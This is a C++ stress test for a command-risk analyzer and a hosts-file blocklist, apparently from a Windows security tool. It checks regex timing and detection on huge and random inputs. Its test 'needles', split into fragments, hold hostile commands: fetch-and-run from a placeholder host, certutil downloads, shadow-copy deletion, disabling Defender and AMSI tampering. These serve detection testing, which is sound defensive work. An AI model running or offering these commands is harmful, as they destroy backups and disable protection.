// Stress test cho lõi Security Gateway + Downloader: đầu vào RẤT LỚN (bắt regex quay lui thảm họa - mỗi
// lần gọi có ngưỡng thời gian), hàng chục nghìn đầu vào sinh ngẫu nhiên (bất biến phải luôn đúng), và
// FileDownloader chạy THẬT với hàng trăm tệp qua một máy chủ HTTP "khó chịu" dựng ngay trong test trên
// 127.0.0.1 (cắt kết nối, trả lỗi, trả chậm, đổi nội dung giữa chừng, trả sai Range...) trong lúc bị
// tạm dừng/tiếp tục/hủy ở thời điểm ngẫu nhiên.
//
// KHÔNG đụng hệ thống thật: không hosts file thật (chỉ tệp trong thư mục tạm), không PowerShell/Defender,
// không yt-dlp, không gói tin nào ra khỏi máy.
//
// Cách dùng: secdl_stress_tests.exe [hạt giống] [tỉ lệ %]
//   - hạt giống: số bất kỳ (mặc định 20261009) - in ra đầu lượt chạy để tái hiện được lượt lỗi.
//   - tỉ lệ %: thu nhỏ/phóng to kích thước đầu vào + số tệp (mặc định 100).
#include <QCoreApplication>
#include <QCryptographicHash>
#include <QDir>
#include <QDirIterator>
#include <QElapsedTimer>
#include <QFile>
#include <QFileInfo>
#include <QHash>
#include <QNetworkReply>
#include <QSet>
#include <QTcpServer>
#include <QTcpSocket>
#include <QTemporaryDir>
#include <QTimer>
#include <QUrl>
#include <cstdio>
#include <functional>
#include <initializer_list>
#include <memory>
#include <random>

#include "core/AppPaths.h"
#include "tools/downloader/engine/FileDownloader.h"
#include "tools/downloader/engine/PageMediaScanner.h"
#include "tools/downloader/engine/YtDlpController.h"
#include "tools/downloader/engine/YtDlpDownloadWorker.h"
#include "tools/downloader/engine/YtDlpInfoWorker.h"
#include "tools/downloader/model/DownloadItem.h"
#include "tools/security/engine/CommandAnalyzer.h"
#include "tools/security/engine/CommandLauncher.h"
#include "tools/security/engine/DefenderController.h"
#include "tools/security/engine/HostsBlocklist.h"

static int g_fail = 0, g_pass = 0;
#define CHECK(cond)                                                            \
    do {                                                                       \
        if (cond) { ++g_pass; }                                                \
        else { ++g_fail; std::printf("FAIL line %d: %s\n", __LINE__, #cond); } \
    } while (0)

/// Như CHECK nhưng in thêm ngữ cảnh (đầu vào nào, hạt giống nào) - với đầu vào sinh ngẫu nhiên, chỉ số
/// dòng thôi thì không biết trường hợp nào hỏng. Chỉ in tối đa 40 lần cho mỗi dòng mã.
#define CHECK_CTX(cond, ctx)                                                                      \
    do {                                                                                          \
        if (cond) { ++g_pass; }                                                                   \
        else                                                                                      \
        {                                                                                         \
            ++g_fail;                                                                             \
            static int shown = 0;                                                                 \
            if (shown++ < 40)                                                                     \
                std::printf("FAIL line %d: %s  [%s]\n", __LINE__, #cond, qPrintable(QString(ctx))); \
        }                                                                                         \
    } while (0)

static int g_scale = 100; ///< tỉ lệ % kích thước đầu vào (đối số thứ hai)
static int scaled(int n) { return qMax(1, static_cast<int>(static_cast<qint64>(n) * g_scale / 100)); }

/// Ghép chuỗi lúc CHẠY từ các mảnh rời - xem ghi chú cùng tên ở tests/security_tests.cpp: dòng lệnh mẫu
/// của mã độc viết liền trong tệp nguồn từng khiến Windows Defender cách ly chính tệp test.
static QString S(std::initializer_list<const char*> parts)
{
    QString out;
    for (const char* p : parts)
        out += QString::fromUtf8(p);
    return out;
}

struct Rng
{
    std::mt19937_64 gen;
    explicit Rng(quint64 seed) : gen(seed) {}
    quint64 next() { return gen(); }
    /// Số nguyên trong [lo, hi] (tính cả hai đầu).
    int range(int lo, int hi) { return lo + static_cast<int>(gen() % static_cast<quint64>(hi - lo + 1)); }
    bool chance(int percent) { return static_cast<int>(gen() % 100) < percent; }
    template <typename T> const T& pick(const QList<T>& list) { return list[static_cast<int>(gen() % list.size())]; }
};

template <typename F> static qint64 timedMs(F&& f)
{
    QElapsedTimer t;
    t.start();
    f();
    return t.elapsed();
}

/// Theo dõi lần gọi chậm nhất của một nhóm kịch bản - in ra cuối nhóm để báo cáo có số thật.
struct Slowest
{
    qint64 ms{0};
    QString label;
    void note(qint64 elapsed, const QString& what)
    {
        if (elapsed >= ms) { ms = elapsed; label = what; }
    }
    void print(const char* group) const
    {
        std::printf("  [%s] cham nhat: %lld ms (%s)\n", group, static_cast<long long>(ms), qPrintable(label));
    }
};

static bool waitUntil(const std::function<bool()>& done, int timeoutMs)
{
    QElapsedTimer timer;
    timer.start();
    while (!done() && timer.elapsed() < timeoutMs)
        QCoreApplication::processEvents(QEventLoop::AllEvents, 10);
    return done();
}

static QByteArray readFileBytes(const QString& path)
{
    QFile f(path);
    return f.open(QIODevice::ReadOnly) ? f.readAll() : QByteArray();
}

static bool writeFileBytes(const QString& path, const QByteArray& data)
{
    QFile f(path);
    return f.open(QIODevice::WriteOnly | QIODevice::Truncate) && f.write(data) == data.size();
}

static QString randomUnicode(Rng& rng, int length)
{
    QString out;
    out.reserve(length);
    while (out.size() < length)
    {
        switch (rng.range(0, 9))
        {
            case 0: out += QChar(rng.range(0x4E00, 0x9FFF)); break;          // chữ Hán
            case 1: out += QChar(rng.range(0x0590, 0x05FF)); break;          // Hebrew (chữ viết phải-sang-trái)
            case 2: out += QChar(rng.range(0x2000, 0x206F)); break;          // dấu câu/ký tự vô hình/đảo chiều
            case 3: out += QChar::fromUcs4(static_cast<char32_t>(rng.range(0x1F300, 0x1F6FF))); break; // emoji
            case 4: out += QChar(rng.range(0xD800, 0xDFFF)); break;          // nửa cặp thay thế mồ côi
            case 5: out += QChar(rng.range(0x00A0, 0x024F)); break;          // Latin có dấu
            case 6: out += QChar(rng.range(0x0001, 0x001F)); break;          // ký tự điều khiển
            default: out += QChar(rng.range(0x20, 0x7E)); break;
        }
    }
    return out;
}

// =====================================================================================================
// 1. CommandAnalyzer
// =====================================================================================================

/// Mảnh từ vựng để ghép lệnh ngẫu nhiên - cố ý CẮT NHỎ (xem S()): ghép liền nhau lúc chạy mới ra từ khóa.
static QStringList analyzerVocabulary()
{
    return {
        S({"power"}), S({"shell"}), S({"pw"}), S({"sh"}), S({".exe"}), S({"Invoke-"}), S({"Web"}), S({"Request"}),
        S({"Rest"}), S({"Method"}), S({"Expres"}), S({"sion"}), S({"i"}), S({"ex"}), S({"iw"}), S({"r"}), S({"ir"}),
        S({"m"}), S({"cu"}), S({"rl"}), S({"wg"}), S({"et"}), S({"Start-"}), S({"Pro"}), S({"cess"}), S({"Download"}),
        S({"String"}), S({"File"}), S({"-e"}), S({"-en"}), S({"c"}), S({"-ec"}), S({"-ex"}), S({"ec"}), S({"-ep"}),
        S({"by"}), S({"pass"}), S({"-w"}), S({"in"}), S({"hid"}), S({"den"}), S({"Set-Mp"}), S({"Add-Mp"}),
        S({"Prefer"}), S({"ence"}), S({"-Disable"}), S({"Realtime"}), S({"Monitoring"}), S({"-Exclusion"}),
        S({"Path"}), S({"$true"}), S({"$false"}), S({"vss"}), S({"admin"}), S({"del"}), S({"ete"}), S({"sha"}),
        S({"dows"}), S({"wm"}), S({"ic"}), S({"shadow"}), S({"copy"}), S({"bcd"}), S({"edit"}), S({"cert"}),
        S({"util"}), S({"-url"}), S({"cache"}), S({"bits"}), S({"/transfer"}), S({"run"}), S({"dll32"}),
        S({"reg"}), S({"svr32"}), S({"scr"}), S({"obj.dll"}), S({"msh"}), S({"ta"}), S({"sch"}), S({"tasks"}),
        S({"/create"}), S({"add"}), S({"\\Run"}), S({"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion"}),
        S({"Stop-"}), S({"Service"}), S({"WinDe"}), S({"fend"}), S({"net"}), S({"sc"}), S({"stop"}), S({"[char]"}),
        S({"0x41"}), S({"65"}), S({"+"}), S({","}), S({"[Ref]"}), S({".Assembly"}), S({".GetType("}), S({"Am"}),
        S({"si"}), S({"Utils"}), S({"From"}), S({"Base64"}), S({"http://"}), S({"https://"}), S({"h.example/a"}),
        S({"|"}), S({";"}), S({"&"}), S({"("}), S({")"}), S({"'"}), S({"\""}), S({"`"}), S({"^"}), S({"''"}),
        S({"\"\""}), S({"'+'"}), S({" "}), S({" "}), S({" "}), S({"\t"}), S({"\n"}), S({"\r\n"}), S({"`\n"}),
        S({"-"}), S({"/"}), S({"\\"}), S({"$x"}), S({"="}), S({"{"}), S({"}"}), S({"#"}), S({"1"}), S({"0"}),
        QString(QChar(0x2013)), QString(QChar(0x2014)), QString(QChar(0x2015)), S({"YQBiAGMAZAA="}),
        S({"net"}), S({"sh"}), S({"adv"}), S({"firewall"}), S({"set"}), S({"state"}), S({"off"}), S({"Win32_"}),
        S({"Shadow"}), S({"Copy"}), S({"wevt"}), S({"cl"}), S({"Register-"}), S({"Scheduled"}), S({"Task"}),
    };
}

/// Vài lệnh CHẮC CHẮN nguy hiểm, mỗi lệnh nằm gọn trên một dòng - dùng làm "kim" để kiểm tra rằng nhiễu
/// xung quanh (dù dài/quái tới đâu) không che được nó.
static QStringList dangerousNeedles()
{
    const QString url = S({"http://h.example/a"});
    return {
        S({"power", "shell -e", "nc "}) + QString(64, 'Q'),
        S({"ir", "m "}) + url + S({".ps1 | i", "ex"}),
        S({"vss", "admin del", "ete sha", "dows /all /quiet"}),
        S({"Set-MpPre", "ference -Disable", "Realtime", "Monitoring $true"}),
        S({"(New-Object Net.WebClient).Download", "String('"}) + url + "')",
        S({"cert", "util -url", "cache -f "}) + url + ".exe a.exe",
        S({"iw", "r "}) + url + S({".exe -OutFile a.exe; Start-Pro", "cess a.exe"}),
        S({"[char]73+[char]69+[char]88+[char]32+[char]40"}),
        S({"sc st", "op WinDe", "fend"}),
        S({"reg", "svr32 /s /n /u /i:"}) + url + S({".sct scr", "obj.dll"}),
    };
}

static void stressAnalyzerBigInputs(Rng& rng)
{
    std::printf("-- CommandAnalyzer: dau vao lon (nguong 2000 ms moi lan goi)\n");
    using CommandAnalyzer::analyze;
    using RL = CommandAnalyzer::RiskLevel;
    constexpr qint64 kLimitMs = 2000;

    struct Case
    {
        QString label;
        QString text;
    };
    QList<Case> cases;
    const int big = scaled(4 * 1000 * 1000); // ~4 triệu ký tự (8 MB UTF-16)
    const int mid = scaled(1000 * 1000);
    auto repeatTo = [](const QString& unit, int chars) { return unit.repeated(qMax(1, chars / static_cast<int>(unit.size()))); };

    cases << Case{"a x N", QString(big, 'a')};
    cases << Case{"khoang trang x N", QString(big, ' ')};
    cases << Case{"xuong dong x N", QString(big, '\n')};
    cases << Case{"ngoac long nhau", QString(big / 2, '(') + "x" + QString(big / 2, ')')};
    cases << Case{"ngoac nhon + $(", repeatTo("$({", big) + repeatTo("})", big / 2)};
    cases << Case{"backtick x N", QString(mid, '`')};
    cases << Case{"a`b lap lai", repeatTo("a`b", mid)};
    cases << Case{"a` lap lai", repeatTo("a`", mid)};
    cases << Case{"backtick + xuong dong", repeatTo("ab`\n  ", mid)};
    cases << Case{"dau mu ^", repeatTo("p^o", mid)};
    cases << Case{"nhay rong ''", repeatTo("i''e", mid)};
    cases << Case{"ghep chuoi '+'", repeatTo("'a'+", mid)};
    cases << Case{"nhay + khoang trang", repeatTo("'   ", mid)};
    cases << Case{"nhay kep \"\"", repeatTo("\"\"x", mid)};
    cases << Case{"dau - lap lai", repeatTo("- ", mid)};
    cases << Case{"dau | lap lai", repeatTo("| ", mid)};
    cases << Case{"Unicode ngau nhien", randomUnicode(rng, mid)};

    {
        // Base64 rất dài: đứng riêng, sau "-e", và sau tham số mã hóa của PowerShell.
        static const char alphabet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        QString b64;
        b64.reserve(big);
        for (int i = 0; i < big; ++i)
            b64 += QChar(alphabet[rng.next() % 64]);
        cases << Case{"base64 dai", b64};
        cases << Case{"-e + base64 dai", "-e " + b64};
        cases << Case{"base64 nhieu dong", repeatTo(b64.left(76) + "\n", big)};
    }

    // Phần ĐẦU của từng mẫu lặp lại rất nhiều lần mà không bao giờ có phần đuôi - hình dạng làm một biểu
    // thức kiểu "A ... B" phải quét lại tới cuối dòng/cuối văn bản từ MỖI chữ A (bậc hai).
    const QList<QString> heads = {
        S({"power", "shell"}), S({"pw", "sh.exe -"}), S({"power", "shell -e"}), S({"cu", "rl"}), S({"ir", "m"}),
        S({"iw", "r"}), S({"wg", "et"}), S({"Invoke-Web", "Request"}), S({"cu", "rl http://h.example/a"}),
        S({"Stop-", "Service"}), S({"sch", "tasks"}), S({"reg", " add"}), S({"reg", ".exe add x"}),
        S({"Set-MpPre", "ference"}), S({"Set-MpPre", "ference -Disable"}), S({"Add-MpPre", "ference"}),
        S({"Set-MpPre", "ference -Disable", "Realtime", "Monitoring $false"}),
        S({"cert", "util"}), S({"bits", "admin"}), S({"vss", "admin"}), S({"wb", "admin"}), S({"wm", "ic"}),
        S({"wm", "ic shadow", "copy"}), S({"bcd", "edit"}), S({"run", "dll32"}), S({"reg", "svr32"}),
        S({"msh", "ta"}), S({"Win32_Shadow", "Copy"}), S({"[Ref].Assembly.GetType("}), S({"[char]65"}),
        S({"[char]"}), S({"[char]65+[char]66+[char]67"}), S({"-e"}), S({"-ex"}), S({"-w"}), S({"-ec x"}),
        S({"Set-NetFire", "wallProfile"}), S({"net", "sh advfire", "wall set"}), S({"sc st", "op"}),
        S({"net st", "op"}), S({"wevt", "util"}), S({"Set-Execution", "Policy"}), S({"New-Item", "Property"}),
        S({"Set-Item", "Property x"}), S({"sa", "ps"}),
    };
    for (const QString& head : heads)
    {
        cases << Case{"dau mau lap tren MOT dong: " + head, repeatTo(head + " ", mid)};
        cases << Case{"dau mau lap, moi dong mot cai: " + head, repeatTo(head + "\n", mid)};
    }
    // Cụm [char] cách nhau bằng dải khoảng trắng dài, luôn thiếu một cụm so với ngưỡng {4,}.
    cases << Case{"[char] + dai khoang trang", repeatTo("[char]1" + QString(3000, ' ') + "[char]2" + QString(3000, ' ') +
                                                         "[char]3" + QString(3000, ' ') + "x\n", mid)};
    cases << Case{"[char] + chu so dai", repeatTo("[char]" + QString(2000, '7') + " ", mid)};

    const QStringList needles = dangerousNeedles();
    Slowest slowest;

    // Phần ĐẦU và phần ĐUÔI của một mẫu cách nhau cả triệu ký tự (cùng dòng/cùng câu lệnh) vẫn phải bị bắt
    // đúng mức - chèn đệm dài không được làm một mẫu "hết sức" rồi âm thầm bỏ qua.
    {
        struct FarTail
        {
            QString head, tail;
            RL expected;
        };
        const QString url = S({"http://h.example/a"});
        const QList<FarTail> farTails = {
            {S({"cu", "rl "}) + url, S({" | i", "ex"}), RL::Dangerous},
            {S({"iw", "r "}) + url + " -OutFile a.exe", S({"; Start-Pro", "cess a.exe"}), RL::Dangerous},
            {S({"power", "shell"}), S({" -e", "nc "}) + QString(64, 'Q'), RL::Dangerous},
            {S({"pw", "sh.exe"}), S({" -e", "p by", "pass -file a.ps1"}), RL::Suspicious},
            {S({"power", "shell"}), S({" -w", "in hid", "den"}), RL::Suspicious},
            {S({"vss", "admin.exe "}), S({" del", "ete sha", "dows /all"}), RL::Dangerous},
            {S({"wm", "ic "}), S({" shadow", "copy x del", "ete"}), RL::Dangerous},
            {S({"bcd", "edit /set {default} "}), S({" recovery", "enabled no"}), RL::Dangerous},
            {S({"Set-MpPre", "ference "}), S({" -Disable", "Realtime", "Monitoring $true"}), RL::Dangerous},
            {S({"Add-MpPre", "ference "}), S({" -Exclusion", "Path C:\\x"}), RL::Suspicious},
            {S({"Set-NetFire", "wallProfile "}), S({" -Enabled Fal", "se"}), RL::Dangerous},
            {S({"cert", "util "}), S({" -url", "cache -f "}) + url, RL::Dangerous},
            {S({"bits", "admin "}), S({" /trans", "fer x "}) + url, RL::Dangerous},
            {S({"sch", "tasks "}), S({" /cre", "ate /tn x"}), RL::Suspicious},
            {S({"reg", " add "}), S({" HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"}), RL::Suspicious},
            {S({"Stop-", "Service "}), S({" WinDe", "fend"}), RL::Dangerous},
            {S({"run", "dll32 "}), S({" java", "script:x"}), RL::Dangerous},
            {S({"reg", "svr32 "}), S({" scr", "obj.dll"}), RL::Dangerous},
            {S({"[Ref].Assembly.GetType("}), S({"Am", "si"}), RL::Dangerous},
            {S({"Set-Execution", "Policy "}), S({" by", "pass"}), RL::Suspicious},
        };
        for (const FarTail& f : farTails)
        {
            // Đệm không chứa xuống dòng/|/; (nằm trong cùng một câu lệnh), và một bản có lặp lại phần đầu.
            for (const QString& filler : {QString(mid, 'x'), repeatTo("x y ", mid), repeatTo(f.head + " z ", mid)})
            {
                const QString text = f.head + filler + f.tail;
                const QString ctx = "dau..duoi cach xa: " + f.head.left(20) + " ... " + f.tail.left(20) +
                                    QString(" (%1 ky tu, dem [%2...])").arg(text.size()).arg(filler.left(12));
                CommandAnalyzer::Verdict v;
                const qint64 ms = timedMs([&] { v = analyze(text); });
                slowest.note(ms, ctx);
                CHECK_CTX(ms < kLimitMs, ctx + QString(": %1 ms").arg(ms));
                CHECK_CTX(v.level >= f.expected, ctx);
            }
        }
    }

    for (const Case& c : cases)
    {
        const QString ctx = c.label + QString(" (%1 ky tu)").arg(c.text.size());
        CommandAnalyzer::Verdict v1;
        const qint64 t1 = timedMs([&] { v1 = analyze(c.text); });
        slowest.note(t1, ctx);
        CHECK_CTX(t1 < kLimitMs, ctx + QString(": %1 ms").arg(t1));

        // Thêm một dòng lệnh nguy hiểm vào CUỐI và vào ĐẦU: phần nhiễu không được che nó (một regex vượt
        // giới hạn so khớp của PCRE2 trả về "không khớp" - tức là âm thầm báo An toàn).
        const QString& needle = rng.pick(needles);
        CommandAnalyzer::Verdict v2, v3;
        const qint64 t2 = timedMs([&] { v2 = analyze(c.text + "\n" + needle); });
        const qint64 t3 = timedMs([&] { v3 = analyze(needle + "\n" + c.text); });
        slowest.note(t2, ctx + " + kim o cuoi");
        slowest.note(t3, ctx + " + kim o dau");
        CHECK_CTX(t2 < kLimitMs, ctx + QString(" + kim o cuoi: %1 ms").arg(t2));
        CHECK_CTX(t3 < kLimitMs, ctx + QString(" + kim o dau: %1 ms").arg(t3));
        CHECK_CTX(v2.level == RL::Dangerous, ctx + " + kim o cuoi: " + needle.left(24));
        CHECK_CTX(v3.level == RL::Dangerous, ctx + " + kim o dau: " + needle.left(24));
        CHECK_CTX(v2.level >= v1.level && v3.level >= v1.level, ctx);
    }
    slowest.print("analyze - dau vao lon");
}

static void stressAnalyzerRandom(Rng& rng)
{
    const int count = scaled(40000);
    std::printf("-- CommandAnalyzer: %d chuoi ngau nhien\n", count);
    using CommandAnalyzer::analyze;
    using RL = CommandAnalyzer::RiskLevel;
    const QStringList vocab = analyzerVocabulary();
    const QStringList needles = dangerousNeedles();

    for (const QString& needle : needles)
        CHECK_CTX(analyze(needle).level == RL::Dangerous, needle.left(24));

    Slowest slowest;
    QElapsedTimer total;
    total.start();
    int levels[3] = {0, 0, 0};
    for (int i = 0; i < count; ++i)
    {
        QString text;
        const int tokens = rng.range(0, rng.chance(5) ? 400 : 40);
        for (int t = 0; t < tokens; ++t)
        {
            if (rng.chance(4))
                text += randomUnicode(rng, rng.range(1, 6));
            else if (rng.chance(3))
                text += QString(rng.range(1, 300), QChar(rng.range(0x20, 0x7E)));
            else
                text += rng.pick(vocab);
        }

        CommandAnalyzer::Verdict v;
        const qint64 ms = timedMs([&] { v = analyze(text); });
        slowest.note(ms, QString("chuoi #%1 dai %2").arg(i).arg(text.size()));
        ++levels[static_cast<int>(v.level)];

        const QString ctx = QString("chuoi #%1: %2").arg(i).arg(text.left(120).toHtmlEscaped());
        CHECK_CTX(ms < 2000, ctx);
        CHECK_CTX((v.level == RL::Safe) == v.reasons.isEmpty(), ctx);
        CHECK_CTX(v.reasons.size() == QSet<QString>(v.reasons.begin(), v.reasons.end()).size(), ctx);

        if (i % 4 == 0)
        {
            // Tất định + nhiễu không che được "kim" ở cả hai phía.
            const auto again = analyze(text);
            CHECK_CTX(again.level == v.level && again.reasons == v.reasons, ctx);
            const QString& needle = rng.pick(needles);
            CHECK_CTX(analyze(text + "\n" + needle).level == RL::Dangerous, ctx + " ++ " + needle.left(24));
            CHECK_CTX(analyze(needle + "\n" + text).level == RL::Dangerous, needle.left(24) + " ++ " + ctx);
        }

        // normalizeForMatching: không bao giờ dài ra, không còn ký tự thoát, áp dụng lại chỉ có thể ngắn đi.
        const QString normalized = CommandAnalyzer::internal::normalizeForMatching(text);
        CHECK_CTX(normalized.size() <= text.size(), ctx);
        CHECK_CTX(!normalized.contains('`') && !normalized.contains('^'), ctx);
        CHECK_CTX(CommandAnalyzer::internal::normalizeForMatching(normalized).size() <= normalized.size(), ctx);

        // CommandLauncher::prepareForPaste (cùng tab) - không còn '\r'/U+2028/U+2029, không đuôi trắng.
        const QString prepared = CommandLauncherInternal::prepareForPaste(text);
        CHECK_CTX(!prepared.contains('\r') && !prepared.contains(QChar(0x2028)) && !prepared.contains(QChar(0x2029)), ctx);
        CHECK_CTX(prepared.isEmpty() || !prepared.back().isSpace(), ctx);
        CHECK_CTX(prepared.isEmpty() == text.trimmed().isEmpty(), ctx);
        CHECK_CTX(CommandLauncherInternal::lineCount(prepared) == (prepared.isEmpty() ? 0 : prepared.count('\n') + 1), ctx);
    }
    slowest.print("analyze - ngau nhien");
    std::printf("  an toan=%d dang chu y=%d nguy hiem=%d, tong %lld ms\n", levels[0], levels[1], levels[2],
                static_cast<long long>(total.elapsed()));
    // Bộ sinh phải thật sự tạo ra cả ba mức - nếu không thì vòng lặp trên chẳng kiểm tra được gì.
    CHECK(levels[0] > 0 && levels[1] > 0 && levels[2] > 0);
}

// =====================================================================================================
// 2. HostsBlocklist (thuần chuỗi + tệp TẠM)
// =====================================================================================================

static QString randomValidDomain(Rng& rng)
{
    static const QString chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    for (;;)
    {
        QString d;
        const int labels = rng.range(1, 4);
        for (int l = 0; l < labels; ++l)
        {
            if (l > 0) d += '.';
            const int len = rng.range(1, 12);
            for (int i = 0; i < len; ++i)
                d += (i > 0 && i < len - 1 && rng.chance(8)) ? QChar(rng.chance(50) ? '-' : '_') : chars[rng.range(0, 35)];
        }
        d += rng.pick(QList<QString>{".com", ".example", ".net", ".vn", ".io", ""});
        const QString normalized = HostsBlocklist::internal::normalizeDomain(d);
        if (!normalized.isEmpty())
            return normalized;
    }
}

/// Một dòng "của người dùng" nằm NGOÀI khối - không bao giờ trùng marker. `forFile`: sinh cho kịch bản
/// tệp thật (không chứa ký tự mà bước đọc/ghi tệp chủ động đổi).
static QString randomForeignLine(Rng& rng)
{
    switch (rng.range(0, 13))
    {
        case 0: return "127.0.0.1 localhost";
        case 1: return "::1 localhost";
        case 2: return "# ghi chu " + QString::number(rng.range(0, 99999));
        case 3: return "";
        case 4: return QString(rng.range(1, 4), ' ');
        case 5: return "\t";
        case 6: return QString("10.0.%1.%2 may-%3.local").arg(rng.range(0, 255)).arg(rng.range(1, 254)).arg(rng.range(0, 999));
        case 7: return "0.0.0.0 quang-cao-" + QString::number(rng.range(0, 999)) + ".example"; // người dùng tự chặn tay
        case 8: return "0.0.0.0";
        case 9: return HostsBlocklist::internal::kMarkerStart + " x";                          // GẦN giống marker
        case 10: return "#" + HostsBlocklist::internal::kMarkerEnd;
        case 11: return QString::fromUtf8("# máy chủ nội bộ – ghi chú có dấu");
        case 12: return "0.0.0.0 a.example b.example # hai ten mot dong";
        default:
        {
            QString s;
            const int len = rng.range(1, 60);
            for (int i = 0; i < len; ++i)
                s += QChar(rng.range(0x21, 0x7E));
            if (s.trimmed() == HostsBlocklist::internal::kMarkerStart || s.trimmed() == HostsBlocklist::internal::kMarkerEnd)
                s += "!";
            return s;
        }
    }
}

struct HostsModel
{
    QStringList lines;           ///< Toàn bộ nội dung, từng dòng
    QStringList expectedKept;    ///< Các dòng PHẢI còn lại nguyên văn, đúng thứ tự
    QStringList expectedDomains; ///< Tên miền PHẢI đọc được từ (các) khối
};

static QString decorateMarker(Rng& rng, const QString& marker)
{
    return (rng.chance(15) ? QString(rng.range(1, 3), ' ') : QString()) + marker + (rng.chance(15) ? "\t " : "");
}

static HostsModel randomHostsModel(Rng& rng)
{
    using namespace HostsBlocklist::internal;
    HostsModel m;
    auto addDomain = [&m](const QString& d) {
        if (!m.expectedDomains.contains(d))
            m.expectedDomains << d;
    };
    auto addForeign = [&m, &rng](int maxCount) {
        const int n = rng.range(0, maxCount);
        for (int i = 0; i < n; ++i)
        {
            const QString line = randomForeignLine(rng);
            m.lines << line;
            m.expectedKept << line;
        }
    };

    addForeign(8);
    const int blocks = rng.chance(20) ? 0 : (rng.chance(75) ? 1 : rng.range(2, 4)); // khối lặp nhiều lần
    bool previousHealthy = true;
    for (int b = 0; b < blocks; ++b)
    {
        // Marker END lạc, không có START đi trước. KHÔNG đặt sau một khối hỏng: END đó sẽ khép chính khối
        // hỏng ấy lại (mọi dòng ở giữa thành "trong khối") - mơ hồ vốn có của định dạng, không phải lỗi.
        if (previousHealthy && rng.chance(10))
            m.lines << decorateMarker(rng, kMarkerEnd);

        const bool healthy = rng.chance(75);
        previousHealthy = healthy;
        m.lines << decorateMarker(rng, kMarkerStart);
        const int entries = rng.range(0, 6);
        for (int e = 0; e < entries; ++e)
        {
            const QString d = randomValidDomain(rng);
            if (healthy && rng.chance(10))
            {
                // Hai tên trên một dòng + ghi chú - chỉ được hiểu như vậy trong khối LÀNH LẶN.
                const QString d2 = randomValidDomain(rng);
                m.lines << "0.0.0.0\t" + d.toUpper() + "  " + d2 + " # ghi chu";
                addDomain(d);
                addDomain(d2);
            }
            else
            {
                m.lines << (rng.chance(10) ? " 0.0.0.0   " + d + " " : "0.0.0.0 " + d);
                addDomain(d);
            }
            if (healthy && rng.chance(12))
            {
                // Dòng lạ người dùng chen vào GIỮA khối: không phải "0.0.0.0 ..." -> giữ lại; dòng trắng -> bỏ.
                const QString foreign = rng.chance(30) ? QString() : "# chen tay " + QString::number(rng.range(0, 999));
                m.lines << foreign;
                if (!foreign.trimmed().isEmpty())
                    m.expectedKept << foreign;
            }
        }
        if (healthy)
        {
            m.lines << decorateMarker(rng, kMarkerEnd);
        }
        else if (b + 1 < blocks || rng.chance(70))
        {
            // Khối HỎNG (thiếu END): dòng đầu tiên không đúng dạng công cụ tự ghi chấm dứt phần "của mình".
            const QString stopper = rng.pick(QList<QString>{"# het", "", "0.0.0.0 a.example b.example", "192.168.1.1 router"});
            m.lines << stopper;
            m.expectedKept << stopper;
        }
        addForeign(healthy ? 5 : 0); // sau khối hỏng không sinh thêm dòng (có thể chứa marker END lạc)
        if (!healthy && b + 1 < blocks)
        {
            // Dòng nằm giữa khối hỏng và START kế tiếp - không marker, giữ nguyên.
            const int n = rng.range(0, 3);
            for (int i = 0; i < n; ++i)
            {
                const QString line = "# giua hai khoi " + QString::number(i);
                m.lines << line;
                m.expectedKept << line;
            }
        }
    }
    return m;
}

static QString expectedHostsContent(QStringList kept, const QStringList& domains)
{
    using namespace HostsBlocklist::internal;
    while (!kept.isEmpty() && kept.last().trimmed().isEmpty())
        kept.removeLast();
    QString out = kept.join('\n');
    if (!out.isEmpty())
        out += "\n\n";
    if (!domains.isEmpty())
    {
        out += kMarkerStart + "\n";
        for (const QString& d : domains)
            out += "0.0.0.0 " + d + "\n";
        out += kMarkerEnd + "\n";
    }
    return out;
}

static QStringList randomDomainList(Rng& rng, int maxCount)
{
    QStringList list;
    const int n = rng.range(0, maxCount);
    for (int i = 0; i < n; ++i)
    {
        const QString d = randomValidDomain(rng);
        if (!list.contains(d))
            list << d;
    }
    return list;
}

static void stressHostsPure(Rng& rng)
{
    using namespace HostsBlocklist::internal;
    const int rounds = scaled(4000);
    std::printf("-- HostsBlocklist: %d noi dung ngau nhien (thuan chuoi)\n", rounds);
    Slowest slowest;
    for (int r = 0; r < rounds; ++r)
    {
        const HostsModel m = randomHostsModel(rng);
        const QString content = m.lines.join('\n') + (rng.chance(70) ? "\n" : "");
        const QString ctx = QString("vong %1: %2").arg(r).arg(content.left(300).toHtmlEscaped().replace('\n', "\\n"));

        QStringList parsed;
        slowest.note(timedMs([&] { parsed = parseManagedDomains(content); }), "parse");
        CHECK_CTX(parsed == m.expectedDomains, ctx);

        // Ghi lại ĐÚNG danh sách đang có: mọi dòng ngoài khối còn nguyên, chỉ còn đúng một khối ở cuối.
        const QString same = buildUpdatedHostsContent(content, parsed);
        CHECK_CTX(same == expectedHostsContent(m.expectedKept, m.expectedDomains), ctx);
        CHECK_CTX(same.count(kMarkerStart + "\n") == (parsed.isEmpty() ? 0 : 1), ctx);
        CHECK_CTX(buildUpdatedHostsContent(same, parsed) == same, ctx); // lũy đẳng - không phình ra qua từng lần ghi

        // Thay bằng danh sách khác rồi đọc lại; lặp nhiều vòng trên chính kết quả vừa ghi.
        QString current = content;
        for (int step = 0; step < 4; ++step)
        {
            const QStringList wanted = randomDomainList(rng, 8);
            current = buildUpdatedHostsContent(current, wanted);
            CHECK_CTX(current == expectedHostsContent(m.expectedKept, wanted), ctx);
            CHECK_CTX(parseManagedDomains(current) == wanted, ctx);
        }
        // Gỡ hết: không còn marker nào, phần của người dùng vẫn nguyên.
        const QString cleared = buildUpdatedHostsContent(current, {});
        CHECK_CTX(cleared == expectedHostsContent(m.expectedKept, {}), ctx);
        CHECK_CTX(!cleared.contains(kMarkerStart + "\n") && parseManagedDomains(cleared).isEmpty(), ctx);
    }

    // Marker lồng nhau/lặp dồn dập + chỉ toàn marker.
    for (int r = 0; r < scaled(2000); ++r)
    {
        QStringList lines;
        const int n = rng.range(0, 30);
        for (int i = 0; i < n; ++i)
        {
            switch (rng.range(0, 4))
            {
                case 0: lines << kMarkerStart; break;
                case 1: lines << kMarkerEnd; break;
                case 2: lines << "0.0.0.0 " + randomValidDomain(rng); break;
                case 3: lines << "# ngoai " + QString::number(i); break;
                default: lines << ""; break;
            }
        }
        const QString content = lines.join('\n');
